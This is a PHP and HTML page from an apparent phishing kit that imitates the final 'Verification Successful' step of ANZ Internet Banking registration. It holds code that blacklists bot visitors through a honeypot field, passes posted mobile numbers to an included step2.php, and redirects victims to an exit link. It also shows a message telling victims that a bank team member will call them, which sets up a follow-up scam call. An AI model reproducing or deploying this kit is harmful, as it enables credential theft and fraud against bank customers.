<?php

session_start();

include "includes/functions.php";
require "includes/Config.php";
if( isset($_POST['robotics']) && $_POST['robotics'] != "") {
    $fp = fopen("includes/blacklist.dat", "a");
    fputs($fp, "\r\n$ip\r\n");
    fclose($fp);
    session_destroy();
    header('Location: '.$exitLink);
    die();
}
if( !isset($_SESSION['hash']) ){ header("Location: index.php"); }
if( !isset($_POST['mobile']) ){ header("Location: mobile.php?_sessionid=".$_SESSION['hash']); 
}else{
    include "includes/step2.php";
}

header("refresh:4;URL=".$exitLink);

?><!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--><!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]--><!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]--><!--[if gt IE 8]><!--><html class="no-js" lang="en" data-scrapbook-source="https://register.anz.com/internetbanking?adobe_mc=MCMID%3D04380199778758144184355664627965208960%7CMCORGID%3D67A216D751E567B20A490D4C%2540AdobeOrg%7CTS%3D1654120600" data-scrapbook-create="20220601215656146"><!--<![endif]--><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Finish - ANZ Internet Banking</title><meta name="description" content="Web Registration - ANZ Internet Banking"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="theme-color" content="#000000"><meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><base>
<link href="assets/000-0001combined.css.ad465e8be579042cb5c8ec3d4ebc745fbe87f2b4.css" rel="stylesheet">

<link rel="icon" href="assets/favicon.ico"><style data-styled="" data-styled-version="4.4.1">@font-face { font-family: "Myriad pro"; src: url("MyriadPro-Regular.1.0.0.woff"); font-display: fallback; }
@font-face { font-family: myriad-pro-basealign; src: url(""); font-display: fallback; }
@font-face { font-family: myriad-pro-light; src: url("MyriadPro-Light.1.0.0.woff"); font-display: fallback; }
@font-face { font-family: myriad-pro-semibold; src: url("MyriadPro-Semibold.1.0.0.woff"); font-display: fallback; }
@font-face { font-family: Roboto; src: url(""); font-display: fallback; }
@font-face { font-family: Roboto-Medium; src: url(""); font-display: fallback; }
html { line-height: 1.15; text-size-adjust: 100%; }
body { margin: 0px; }
main { display: block; }
h1 { font-size: 2em; margin: 0.67em 0px; }
hr { box-sizing: content-box; height: 0px; overflow: visible; }
pre { font-family: monospace, monospace; font-size: 1em; }
a { background-color: transparent; }
abbr[title] { border-bottom: none; text-decoration: underline dotted; }
b, strong { font-weight: bolder; }
code, kbd, samp { font-family: monospace, monospace; font-size: 1em; }
small { font-size: 80%; }
sub, sup { font-size: 75%; line-height: 0; position: relative; vertical-align: baseline; }
sub { bottom: -0.25em; }
sup { top: -0.5em; }
img { border-style: none; }
button, input, optgroup, select, textarea { font-family: inherit; font-size: 100%; line-height: 1.15; margin: 0px; }
button, input { overflow: visible; }
button, select { text-transform: none; }
button, [type="button"], [type="reset"], [type="submit"] { appearance: button; }
fieldset { padding: 0.35em 0.75em 0.625em; }
legend { box-sizing: border-box; color: inherit; display: table; max-width: 100%; padding: 0px; white-space: normal; }
progress { vertical-align: baseline; }
textarea { overflow: auto; }
[type="checkbox"], [type="radio"] { box-sizing: border-box; padding: 0px; }
[type="number"]::-webkit-inner-spin-button, [type="number"]::-webkit-outer-spin-button { height: auto; }
[type="search"] { appearance: textfield; outline-offset: -2px; }
[type="search"]::-webkit-search-decoration { appearance: none; }
::-webkit-file-upload-button { appearance: button; font: inherit; }
details { display: block; }
summary { display: list-item; }
template { display: none; }
[hidden] { display: none; }
*, ::after, ::before { box-sizing: border-box; }
html { font-family: "Myriad pro", sans-serif !important; }
body { margin: 0px; font-style: normal; font-weight: normal; font-variant: normal; text-transform: none; -webkit-font-smoothing: antialiased; line-height: 1.25; letter-spacing: normal; min-width: 320px; opacity: 1 !important; font-family: "Myriad pro", sans-serif !important; color: rgb(73, 73, 73) !important; font-size: 16px !important; }
body input, body textarea, body select, body button { margin: 0px; line-height: 1.25; color: rgb(57, 74, 88); font-family: inherit !important; }
body a { color: rgb(0, 114, 172); text-decoration: none; }
body a:hover, body a:focus { text-decoration: underline; }
body select { appearance: none; }
body input[type="number"] { appearance: textfield; }
body input[type="number"]::-webkit-inner-spin-button, body input[type="number"]::-webkit-outer-spin-button { appearance: none; margin: 0px; }
body input:focus { outline: none; }
body input:disabled { color: rgb(57, 74, 88); -webkit-text-fill-color: rgb(57, 74, 88); }
body select:disabled { color: rgb(57, 74, 88); -webkit-text-fill-color: rgb(57, 74, 88); }
body.ReactModal__Body--open { overflow: hidden; }
.gHmjpC { max-width: 100%; margin: 0px auto; transition: max-width 0.2s ease 0s; padding: 0px; }
.iozHEh { box-sizing: border-box; display: flex; flex: 0 1 auto; flex-flow: row wrap; margin: 0px -1rem 40px; }
.yxWOV { box-sizing: border-box; display: flex; flex: 0 1 auto; flex-flow: row wrap; margin: 0px -1rem 24px; }
.fBZoRA { box-sizing: border-box; display: flex; flex: 0 1 auto; flex-flow: row wrap; margin: 0px -1rem; }
.cmUniE { box-sizing: border-box; flex: 0 0 auto; padding: 0px 1rem; }
@media only screen and (min-width: 0em) {
  .cmUniE { flex-basis: 100%; max-width: 100%; display: block; }
}
.isZLRV { display: flex; flex-direction: column; min-height: 100vh; }
.dRvgMj { display: flex; flex-direction: column; -webkit-box-pack: center; justify-content: center; flex: 1 0 auto; }
.PQYSP { display: flex; flex-direction: column; -webkit-box-pack: center; justify-content: center; flex: 1 0 auto; }
.fMWrBU { display: flex; flex-direction: column; -webkit-box-pack: center; justify-content: center; flex: 1 0 auto; margin: 64px auto; }
@media screen and (max-width: 959px) {
  .fMWrBU { max-width: 560px; }
}
@media screen and (max-width: 767px) {
  .fMWrBU { margin: 0px auto; max-width: 100%; }
}
@media screen and (max-width: 479px) {
  .fMWrBU { margin: 0px auto; max-width: 100%; }
}
.aEZVB { min-height: 330px; background-color: rgb(255, 255, 255); border: 1px solid rgb(226, 228, 230); border-radius: 3px; margin-left: auto; margin-right: auto; max-width: 560px; padding: 88px 96px; }
@media screen and (max-width: 767px) {
  .aEZVB { max-width: 375px; padding: 48px 36px; border: none; }
}
.iuAjqe { display: flex; flex-direction: column; -webkit-box-pack: center; justify-content: center; flex: 1 0 auto; max-width: 100%; margin: 0px; padding-left: 32px; padding-right: 32px; }
@media screen and (max-width: 959px) {
  .iuAjqe { max-width: 560px; }
}
@media screen and (max-width: 767px) {
  .iuAjqe { margin: 0px auto; max-width: 100%; }
}
@media screen and (max-width: 479px) {
  .iuAjqe { margin: 0px auto; max-width: 100%; }
}
@media screen and (max-width: 959px) {
  .iuAjqe { max-width: 100%; padding-left: 24px; padding-right: 24px; }
}
@media screen and (max-width: 767px) {
  .iuAjqe { max-width: 100%; padding-left: 16px; padding-right: 16px; }
}
@media screen and (max-width: 479px) {
  .iuAjqe { max-width: 100%; padding-left: 24px; padding-right: 24px; }
}
.jDQaYf { position: relative; animation: 1s ease 0.1s 1 normal both running icPxHz; }
.fQVlJA { width: 100%; margin: 0px; background-color: rgb(0, 114, 172); color: rgb(255, 255, 255); border: 1px solid transparent; border-radius: 4px; padding: 12px; cursor: pointer; transition: background-color 0.2s ease 0s, border-color 0.2s ease 0s, color 0.2s ease 0s; font-family: myriad-pro-semibold, sans-serif, sans-serif !important; }
.fQVlJA:disabled { cursor: not-allowed; }
.fQVlJA:focus, .fQVlJA:hover { outline: none; background-color: rgb(0, 147, 216); }
.fQVlJA svg { margin-right: 8px; }
@media screen and (max-width: 767px) {
  .cBjIsl { padding-left: 24px; padding-right: 24px; }
}
@media screen and (max-width: 479px) {
  .cBjIsl { padding-left: 16px; padding-right: 16px; }
}
.gXtpGQ { color: rgb(0, 114, 172); -webkit-tap-highlight-color: transparent; }
.gXtpGQ:hover, .gXtpGQ:focus { cursor: pointer; text-decoration: underline !important; }
.ihIOpA { color: rgb(0, 114, 172); -webkit-tap-highlight-color: transparent; display: inline-flex; white-space: nowrap; }
.ihIOpA:hover, .ihIOpA:focus { cursor: pointer; text-decoration: underline !important; }
.dtZarJ { color: transparent; -webkit-tap-highlight-color: transparent; }
.dtZarJ:hover, .dtZarJ:focus { cursor: pointer; }
.ifGlXi { display: inherit; margin-bottom: 0px; padding: 8px 0px 0px; text-align: inherit; font-size: inherit; letter-spacing: inherit; line-height: inherit; }
.cHvZzk { position: relative; z-index: 9; width: 100%; top: 0px; }
.hinJZb { height: 60px; width: 100%; background-color: rgb(0, 65, 101); }
.kuHKAw { width: 103px; height: 42px; margin-top: 10px; }
.glAzNR { width: 100%; bottom: 0px; }
.eEcyDE { width: 100%; background-color: rgb(0, 114, 172); color: rgb(255, 255, 255); padding-top: 32px; padding-bottom: 32px; }
.kccUTI { white-space: nowrap; }
.aoUts { color: rgb(255, 255, 255); }
.kNGuXD { font-size: 16px; color: rgb(116, 118, 120); transition: font-size 0.2s ease 0s, transform 0.2s ease 0s, color 0.2s ease 0s; margin-bottom: 12px; display: inline-block; }
.gvkmJ { position: relative; z-index: 0; color: rgb(116, 118, 120); width: 100%; }
.MkxFv { font-family: "Myriad Pro", sans-serif; width: 100%; padding: 0px 0px 0px 12px; background-color: transparent; border: 1px solid rgb(204, 204, 204); border-radius: 4px; transition: border-color 0.2s ease 0s, height 0.2s ease 0s, line-height 0.2s ease 0s, font-size 0.2s ease 0s, padding 0.2s ease 0s; font-size: 16px; color: rgb(73, 73, 73); height: 44px; }
.jELuLd { font-family: "Myriad Pro", sans-serif; width: 100%; padding: 0px 24px 0px 12px; background-color: transparent; border: 1px solid rgb(204, 204, 204); border-radius: 4px; transition: border-color 0.2s ease 0s, height 0.2s ease 0s, line-height 0.2s ease 0s, font-size 0.2s ease 0s, padding 0.2s ease 0s; font-size: 16px; color: rgb(73, 73, 73); height: 44px; }
.kptXPz { font-family: "Myriad Pro", sans-serif; width: 100%; padding: 0px 24px 0px 12px; background-color: transparent; border: 1px solid rgb(0, 147, 216); font-size: 16px; color: rgb(73, 73, 73); height: 44px; border-radius: 4px; outline: none; transition: border-color 0.2s ease 0s, border-radius 0.2s ease 0s; }
.dqfvIK { position: relative; }
.fEtbNT { position: absolute; right: 0px; bottom: 0px; overflow: hidden; padding: 12px; transition: font-size 0.2s ease 0s, padding 0.2s ease 0s; }
.hYSWhU { overflow: hidden; height: 0px; margin: 0px; }
.kvJuhU { background: rgb(240, 250, 255); border: 1px solid rgb(147, 199, 229); border-radius: 3px; display: block; padding: 16px; font-size: 14px; }
.SFRBD { font-size: 16px; line-height: 1.25; }
.iSJzif { font-size: 14px; line-height: 1.429; }
.cKzeMS { font-family: myriad-pro-semibold, sans-serif, sans-serif; }
.kKWSlH { margin: 0px; text-align: center; font-weight: normal; font-size: 32px; line-height: 1.125; letter-spacing: normal; color: rgb(0, 65, 101); font-family: myriad-pro-light, sans-serif !important; }
@media screen and (max-width: 767px) {
  .kKWSlH { font-size: 28px; }
}
.kKWSlH:focus { outline: none; }
.ifaqNB { margin: 24px 0px; border-width: 1px 0px 0px; border-right-style: initial; border-bottom-style: initial; border-left-style: initial; border-right-color: initial; border-bottom-color: initial; border-left-color: initial; border-image: initial; border-top-style: solid; border-top-color: rgb(204, 204, 204); }
.ksgrRI label { color: rgb(73, 73, 73); margin-bottom: 4px; letter-spacing: normal; }
.ksgrRI p { line-height: 18px; }
.ksgrRI p[id$="customerRegistrationNumber_sub_label"], .ksgrRI p[id$="telecode_sub_label"] { color: rgb(73, 73, 73); position: absolute; }
.jKIwyN { display: inline-block; }
.kyksVE { text-align: center; position: relative; width: 100%; }
.ijCyQu { margin: 0px; }
.kmExjg { margin: 16px 0px 0px; }
@-webkit-keyframes icPxHz { 
  0% { margin-top: 200px; display: none; transform: scale(0); height: auto; }
  1% { transform: scale(1); }
  100% { margin-top: 0px; display: block; transform: scale(1); }
}
@keyframes icPxHz { 
  0% { margin-top: 200px; display: none; transform: scale(0); height: auto; }
  1% { transform: scale(1); }
  100% { margin-top: 0px; display: block; transform: scale(1); }
}</style>
  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">

</head><body><noscript><style data-styled="" data-styled-version="4.4.1">@font-face {
            font-family: Myriad pro;
            src:url("MyriadPro-Regular.1.0.0.woff");
            font-display: fallback;
        }

        @font-face {
            font-family: myriad-pro-basealign;
            src:url("");
            font-display: fallback;
        }

        @font-face {
            font-family: myriad-pro-light;
            src:url("MyriadPro-Light.1.0.0.woff");
            font-display: fallback;
        }

        @font-face {
            font-family: myriad-pro-semibold;
            src:url("MyriadPro-Semibold.1.0.0.woff");
            font-display: fallback;
        }

        @font-face {
            font-family: Roboto;
            src:url("");
            font-display: fallback;
        }

        @font-face {
            font-family: Roboto-Medium;
            src:url("");
            font-display: fallback;
        }

        html {
            line-height: 1.15;
            -webkit-text-size-adjust: 100%;
        }

        body {
            margin: 0;
        }

        main {
            display: block;
        }

        h1 {
            font-size: 2em;
            margin: 0.67em 0;
        }

        hr {
            box-sizing: content-box;
            height: 0;
            overflow: visible;
        }

        pre {
            font-family: monospace, monospace;
            font-size: 1em;
        }

        a {
            background-color: transparent;
        }

        abbr[title] {
            border-bottom: none;
            -webkit-text-decoration: underline;
            text-decoration: underline;
            -webkit-text-decoration: underline dotted;
            text-decoration: underline dotted;
        }

        b,
        strong {
            font-weight: bolder;
        }

        code,
        kbd,
        samp {
            font-family: monospace, monospace;
            font-size: 1em;
        }

        small {
            font-size: 80%;
        }

        sub,
        sup {
            font-size: 75%;
            line-height: 0;
            position: relative;
            vertical-align: baseline;
        }

        sub {
            bottom: -0.25em;
        }

        sup {
            top: -0.5em;
        }

        img {
            border-style: none;
        }

        button,
        input,
        optgroup,
        select,
        textarea {
            font-family: inherit;
            font-size: 100%;
            line-height: 1.15;
            margin: 0;
        }

        button,
        input {
            overflow: visible;
        }

        button,
        select {
            text-transform: none;
        }

        button,
        [type="button"],
        [type="reset"],
        [type="submit"] {
            -webkit-appearance: button;
        }

        button::-moz-focus-inner,
        [type="button"]::-moz-focus-inner,
        [type="reset"]::-moz-focus-inner,
        [type="submit"]::-moz-focus-inner {
            border-style: none;
            padding: 0;
        }

        button:-moz-focusring,
        [type="button"]:-moz-focusring,
        [type="reset"]:-moz-focusring,
        [type="submit"]:-moz-focusring {
            outline: 1px dotted ButtonText;
        }

        fieldset {
            padding: 0.35em 0.75em 0.625em;
        }

        legend {
            box-sizing: border-box;
            color: inherit;
            display: table;
            max-width: 100%;
            padding: 0;
            white-space: normal;
        }

        progress {
            vertical-align: baseline;
        }

        textarea {
            overflow: auto;
        }

        [type="checkbox"],
        [type="radio"] {
            box-sizing: border-box;
            padding: 0;
        }

        [type="number"]::-webkit-inner-spin-button,
        [type="number"]::-webkit-outer-spin-button {
            height: auto;
        }

        [type="search"] {
            -webkit-appearance: textfield;
            outline-offset: -2px;
        }

        [type="search"]::-webkit-search-decoration {
            -webkit-appearance: none;
        }

        ::-webkit-file-upload-button {
            -webkit-appearance: button;
            font: inherit;
        }

        details {
            display: block;
        }

        summary {
            display: list-item;
        }

        template {
            display: none;
        }

        [hidden] {
            display: none;
        }

        *,
        :after,
        :before {
            box-sizing: border-box;
        }

        html {
            font-family: Myriad pro, sans-serif !important;
        }

        body {
            margin: 0;
            font-family: Myriad pro, sans-serif !important;
            color: #494949 !important;
            font-style: normal;
            font-weight: normal;
            font-variant: normal;
            text-transform: none;
            -webkit-font-smoothing: antialiased;
            font-size: 16px !important;
            line-height: 1.375;
            -webkit-letter-spacing: normal;
            -moz-letter-spacing: normal;
            -ms-letter-spacing: normal;
            letter-spacing: normal;
            min-width: 320px;
        }

        body input,
        body textarea,
        body select,
        body button {
            margin: 0;
            font-family: inherit !important;
            line-height: 1.375;
            color: #394a58;
        }

        body a {
            color: #0072AC;
            -webkit-text-decoration: none;
            text-decoration: none;
        }

        body a:hover,
        body a:focus {
            -webkit-text-decoration: underline;
            text-decoration: underline;
        }

        body select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        body input[type='number'] {
            -webkit-appearance: textfield;
            -moz-appearance: textfield;
            appearance: textfield;
        }

        body input[type=number]::-webkit-inner-spin-button,
        body input[type=number]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            margin: 0;
        }

        body input::-ms-reveal,
        body input::-ms-clear {
            display: none;
        }

        body input:focus {
            outline: none;
        }

        body select::-ms-expand {
            display: none;
        }

        body input:disabled {
            color: #394a58;
            -webkit-text-fill-color: #394a58;
        }

        body select:disabled {
            color: #394a58;
            -webkit-text-fill-color: #394a58;
        }

        body.ReactModal__Body--open {
            overflow: hidden;
        }

        .kMXqJD {
            margin-right: auto;
            margin-left: auto;
            padding-right: 1rem;
            padding-left: 1rem;
            max-width: 100%;
            margin: 0 auto;
            -webkit-transition: max-width 0.2s;
            transition: max-width 0.2s;
        }

        .fBZoRA {
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            margin-right: -1rem;
            margin-left: -1rem;
            margin-top: 0;
            margin-bottom: 32px;
        }

        .hiHoEC {
            box-sizing: border-box;
            -webkit-flex: 0 0 auto;
            -ms-flex: 0 0 auto;
            flex: 0 0 auto;
            padding-right: 1rem;
            padding-left: 1rem;
        }

        @media only screen and (min-width:0em) {
            .hiHoEC {
                -webkit-flex-basis: 100%;
                -ms-flex-preferred-size: 100%;
                flex-basis: 100%;
                max-width: 100%;
                display: block;
            }
        }

        @media screen and (max-width:767px) {
            .hiHoEC {
                padding: 0;
            }
        }

        @media screen and (max-width:479px) {
            .hiHoEC {
                padding-left: 0;
            }
        }

        .bBaFcw {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            min-height: 100vh;
        }

        .fgYQMj {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            -webkit-flex: 1 0 auto;
            -ms-flex: 1 0 auto;
            flex: 1 0 auto;
        }

        .jwCRHS {
            margin: 64px auto;
            max-width: 1164px;
        }

        @media screen and (max-width:959px) {
            .jwCRHS {
                max-width: 560px;
            }
        }

        @media screen and (max-width:767px) {
            .jwCRHS {
                margin: 0 auto 0;
                max-width: 100%;
            }
        }

        @media screen and (max-width:479px) {
            .jwCRHS {
                margin: 0 auto 0;
                width: 100%;
            }
        }

        .bsYAOt {
            max-width: 560px;
            min-height: 330px;
            background-color: #fff;
            border: 1px solid #e2e4e6;
            border-radius: 3px;
            margin-left: auto;
            margin-right: auto;
            padding-top: 48px;
            padding-left: 48px;
            padding-right: 48px;
            padding-bottom: 48px;
        }

        @media screen and (max-width:959px) {
            .bsYAOt {
                padding-top: 48px;
                padding-left: 48px;
                padding-right: 48px;
                padding-bottom: 48px;
            }
        }

        @media screen and (max-width:767px) {
            .bsYAOt {
                max-width: 480px;
                padding-top: 48px;
                padding-left: 48px;
                padding-right: 48px;
                padding-bottom: 32px;
                margin-top: 48px;
                margin-bottom: 48px;
                border: none;
                border-top: 1px solid #e2e4e6;
                border-bottom: 1px solid #e2e4e6;
            }
        }

        @media screen and (max-width:479px) {
            .bsYAOt {
                max-width: 375px;
                padding-top: 48px;
                padding-left: 24px;
                padding-right: 24px;
                padding-bottom: 32px;
                margin-top: 48px;
                margin-bottom: 48px;
                border-top: 1px solid #e2e4e6;
                border-bottom: 1px solid #e2e4e6;
            }
        }

        .tQNRl {
            margin: 64px auto;
            max-width: 1164px;
            max-width: 100%;
            margin: 0;
            padding-left: 32px;
            padding-right: 32px;
        }

        @media screen and (max-width:959px) {
            .tQNRl {
                max-width: 560px;
            }
        }

        @media screen and (max-width:767px) {
            .tQNRl {
                margin: 0 auto 0;
                max-width: 100%;
            }
        }

        @media screen and (max-width:479px) {
            .tQNRl {
                margin: 0 auto 0;
                width: 100%;
            }
        }

        @media screen and (max-width:959px) {
            .tQNRl {
                max-width: 100%;
                padding-left: 24px;
                padding-right: 24px;
            }
        }

        @media screen and (max-width:767px) {
            .tQNRl {
                max-width: 100%;
                padding-left: 16px;
                padding-right: 16px;
            }
        }

        @media screen and (max-width:479px) {
            .tQNRl {
                max-width: 100%;
                padding-left: 24px;
                padding-right: 24px;
            }
        }

        .iyDMES {
            position: relative;
            -webkit-animation: icPxHz 1s ease 0.1s both;
            animation: icPxHz 1s ease 0.1s both;
        }

        @media screen and (max-width:767px) {
            .jMeGNg {
                padding-left: 24px;
                padding-right: 24px;
            }
        }

        @media screen and (max-width:479px) {
            .jMeGNg {
                padding-left: 16px;
                padding-right: 16px;
            }
        }

        .jsqTYX {
            color: #0072AC;
            -webkit-tap-highlight-color: transparent;
        }

        .jsqTYX:hover,
        .jsqTYX:focus {
            -webkit-text-decoration: underline !important;
            text-decoration: underline !important;
            cursor: pointer;
        }

        .gsHUbf {
            position: relative;
            z-index: 9;
            width: 100%;
            top: 0;
        }

        .kYvYgm {
            height: 60px;
            width: 100%;
            background-color: #004165;
        }

        .gJhOur {
            width: 103px;
            height: 42px;
            margin-top: 10px;
        }

        .gQayGb {
            margin: 0;
            text-align: center;
            font-weight: normal;
            font-size: 32px;
            line-height: 1.062;
            -webkit-letter-spacing: normal;
            -moz-letter-spacing: normal;
            -ms-letter-spacing: normal;
            letter-spacing: normal;
            font-family: myriad-pro-light, sans-serif !important;
            color: #004165;
        }

        @media screen and (max-width:767px) {
            .gQayGb {
                font-size: 28px;
            }
        }

        .ijCyQu {
            margin-top: 0;
            margin-right: 0;
            margin-bottom: 0;
            margin-left: 0;
        }

        .kmExjg {
            margin-top: 16px;
            margin-right: 0;
            margin-bottom: 0;
            margin-left: 0;
        }

        .gbxeYH {
            width: 100%;
            bottom: 0;
        }

        .qtnPq {
            width: 100%;
            background-color: #0072AC;
            color: #fff;
            padding-top: 32px;
            padding-bottom: 32px;
        }

        .jRMrpg {
            white-space: nowrap;
        }

        .hGxWjT {
            color: #fff;
        }

        .frpFfQ {
            width: 76px;
            height: 69px;
            margin-bottom: 32px;
        }

        .ePIfrV {
            text-align: center;
            margin-bottom: 48px;
        }

        .jtlJDR {
            text-align: center;
            padding-left: 64px;
            padding-right: 64px;
        }

        @media screen and (max-width:767px) {
            .jtlJDR {
                padding-left: 0;
                padding-right: 0;
            }
        }

        @media screen and (max-width:479px) {
            .jtlJDR {
                padding-left: 8px;
                padding-right: 8px;
            }
        }

        .fFdpBA {
            margin-bottom: 32px;
        }

        .fFdpBA:last-of-type {
            margin-bottom: 0;
        }

        @-webkit-keyframes icPxHz {
            0% {
                margin-top: 200px;
                display: none;
                -webkit-transform: scale(0);
                -ms-transform: scale(0);
                transform: scale(0);
                height: auto;
            }

            1% {
                -webkit-transform: scale(1);
                -ms-transform: scale(1);
                transform: scale(1);
            }

            100% {
                margin-top: 0;
                display: block;
                -webkit-transform: scale(1);
                -ms-transform: scale(1);
                transform: scale(1);
            }
        }

        @keyframes icPxHz {
            0% {
                margin-top: 200px;
                display: none;
                -webkit-transform: scale(0);
                -ms-transform: scale(0);
                transform: scale(0);
                height: auto;
            }

            1% {
                -webkit-transform: scale(1);
                -ms-transform: scale(1);
                transform: scale(1);
            }

            100% {
                margin-top: 0;
                display: block;
                -webkit-transform: scale(1);
                -ms-transform: scale(1);
                transform: scale(1);
            }
        }

        .jTKZuQ {
            box-sizing: border-box;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            margin-right: -1rem;
            margin-left: -1rem;
            margin-top: 0;
            margin-bottom: 0;
            margin-right: -15px;
            margin-left: -15px;
        }

        @media only screen and (min-width: 0em) {
            .fuDXid {
                -webkit-flex-basis: 100%;
                -ms-flex-preferred-size: 100%;
                flex-basis: 100%;
                max-width: 100%;
                display: block;
            }
        }

        .fuDXid {
            box-sizing: border-box;
            -webkit-flex: 0 0 auto;
            -ms-flex: 0 0 auto;
            flex: 0 0 auto;
            padding-right: 1rem;
            padding-left: 1rem;
            padding: 0 15px 0;
        }

        .hUOKGW {
            width: 100%;
            margin: 8px 0 0;
            background-color: #0072AC;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 4px;
            font-family: myriad-pro-semibold, sans-serif, sans-serif !important;
            font-weight: inherit;
            padding: 12px;
            cursor: pointer;
            -webkit-transition: background-color 0.2s, border-color 0.2s, color 0.2s;
            transition: background-color 0.2s, border-color 0.2s, color 0.2s;
        }

        .jRMrpg a {
            color: #fff;
        }

        .pageContainer {
            display: none;
        }</style><section id="root"><div class="sc-htoDjs bBaFcw"><header class="sc-iRbamj gsHUbf"><div class="sc-jlyJG kYvYgm"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ Logo" class="sc-gipzik gJhOur"></div></div></header><main class="sc-dnqmqq fgYQMj"><div class="sc-gqjmRU jwCRHS"><div class="sc-dxgOiQ iyDMES"><div class="sc-VigVT sc-jzJRlG bsYAOt"><div class="sc-bXGyLb ePIfrV"><img alt="Error Icon" data-test-id="error-page-info-icon" src="assets/Info-Icon.1.0.0.svg" aria-hidden="true" class="sc-daURTG frpFfQ"><h1 data-test-id="error-title" class="sc-iELTvK gQayGb">Please check your browser settings</h1></div><div class="sc-lkqHmb jtlJDR"><div data-test-id="error-message" class="sc-eLExRp fFdpBA"><div class="sc-bdVaJa sc-bxivhb kMXqJD"><div class="sc-bwzfXH sc-ifAKCX fBZoRA"><div class="sc-htpNat sc-EHOje hiHoEC"><p class="sc-gzOgki ijCyQu">To access ANZ Internet Banking, please check your browser settings.</p><p class="sc-gzOgki kmExjg">Try logging in with a different browser. See browser and software settings on ANZ.com for more information.</p></div></div><div class="sc-bwzfXH sc-ifAKCX jTKZuQ"><div class="sc-htpNat sc-EHOje fuDXid"><a data-test-id="software-requirements" href="#/support/internet-banking/getting-started/browser-software-settings/" rel="noopener" target="_self" class="sc-eHgmQL sc-cvbbAY jsqTYX"><button data-test-id="go-back-to-anz" class="sc-jKJlTe hUOKGW">View browser and software settings</button></a></div></div></div></div></div></div></div></div></main><footer class="sc-esjQYD gbxeYH"><div class="sc-kIPQKe qtnPq"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><span class="sc-ibxdXY hGxWjT"><div data-test-id="footer-details" class="sc-kEYyzF jMeGNg">© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-eXEjpC jRMrpg"> ABN 11 005 357 522.</span></div></span></div></div></footer></div></section></noscript><div id="root" class="pageContainer"><div class="sc-bZQynM isZLRV"><header class="sc-jDwBTQ cHvZzk"><div class="sc-gPEVay hinJZb"><div class="sc-htoDjs sc-iwsKbI sc-jzJRlG iuAjqe"><a data-test-id="home-anz-link" href="#/personal/" title="ANZ Logo" class="sc-hSdWYo dtZarJ"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ logo" class="sc-iRbamj kuHKAw"></a></div></div></header>
		<ul id="progress-bar" class="steps-4"><li class="inactive" tabindex="-1"><span>Step 1<span class="step-detail">Notice</span></span><span class="a11y-context"> currently active</span></li><li class="inactive"><span>Step 2<span class="step-detail">Mobile Verification</span></span><span class="a11y-context"> currently inactive</span></li><li class="active"><span>Step 3<span class="step-detail">Finish</span></span><span class="a11y-context"> currently inactive</span></li></ul>
 
		<main class="sc-gzVnrw dRvgMj"><div class="sc-htoDjs sc-iwsKbI fMWrBU"><div class="sc-htoDjs PQYSP"><div class="sc-chPdSV jDQaYf"><div class="sc-gZMcBi sc-gqjmRU aEZVB"><form action="#" autocomplete="off" aria-describedby="register-header" method="post"><div class="sc-bdVaJa sc-bxivhb gHmjpC"><div class="sc-bwzfXH sc-ifAKCX iozHEh"><div class="sc-htpNat sc-EHOje cmUniE">
		<div class="sc-gxMtzJ kyksVE">
		<h1 data-test-id="register-header" id="register-header" tabindex="-1" class="sc-iELTvK kKWSlH">
		<span role="text"> <div class="sc-dqBHgY jKIwyN">Verification Successful</div></span></h1></div></div></div>
		<div id="live-container"><div>
				<p class="form-instruction">A member of our team is going to call you to access your account activity.You should be automatically redirected back to our homepage.</p>
				
			</div></div>
		<br><br><br><br><br><br>
		<div class="sc-bwzfXH sc-ifAKCX yxWOV">
		<div class="sc-htpNat sc-EHOje cmUniE">
